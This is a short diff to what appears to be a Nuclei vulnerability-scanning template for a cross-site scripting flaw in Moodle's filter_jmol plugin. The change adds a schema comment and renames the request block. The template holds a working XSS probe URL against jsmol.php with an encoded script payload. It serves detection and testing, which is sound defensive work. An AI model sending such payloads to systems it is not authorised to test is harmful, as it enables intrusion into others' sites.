@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: moodle-filter-jmol-xss
 info:
   name: Moodle filter_jmol - XSS
@@ -6,7 +7,7 @@ info:
   description: Cross-site scripting on Moodle.
   reference: https://www.dionach.com/blog/moodle-jmol-plugin-multiple-vulnerabilities/
   tags: moodle,xss
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/filter/jmol/js/jsmol/php/jsmol.php?call=saveFile&data=%3Cscript%3Ealert(%27XSS%27)%3C/script%3E&mimetype=text/html"
